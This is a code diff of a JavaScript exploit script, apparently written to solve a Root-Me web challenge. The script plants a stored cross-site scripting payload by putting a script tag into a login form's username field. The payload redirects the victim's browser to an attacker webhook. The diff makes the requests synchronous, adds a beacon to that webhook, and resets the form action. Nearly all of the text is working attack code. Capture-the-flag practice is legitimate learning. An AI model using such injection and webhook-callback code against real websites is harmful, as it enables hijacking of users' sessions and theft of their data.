@@ -6,17 +6,18 @@ const OPEN = "rootme";
 
 function get(url) {
   let xhr = new XMLHttpRequest();
-  xhr.open("GET", url, true);
+  xhr.open("GET", url, false);
   return xhr.send(null);
 }
 
 function post(url, data) {
   let xhr = new XMLHttpRequest();
-  xhr.open("POST", url, true);
+  xhr.open("POST", url, false);
   return xhr.send(data);
 }
 
 function openProfile() {
+  post(WEBHOOK, "end");
   document.location = PROFILE;
 }
 
@@ -26,6 +27,7 @@ const payload = `
 document.location = "${WEBHOOK}?open";
 `;
 document.getElementById("username").value = `<script>${payload}</script>`;
+document.getElementById("login").action = LOGIN;
 document.getElementById("login").submit();
 
 setTimeout(() => openProfile(), 3000);
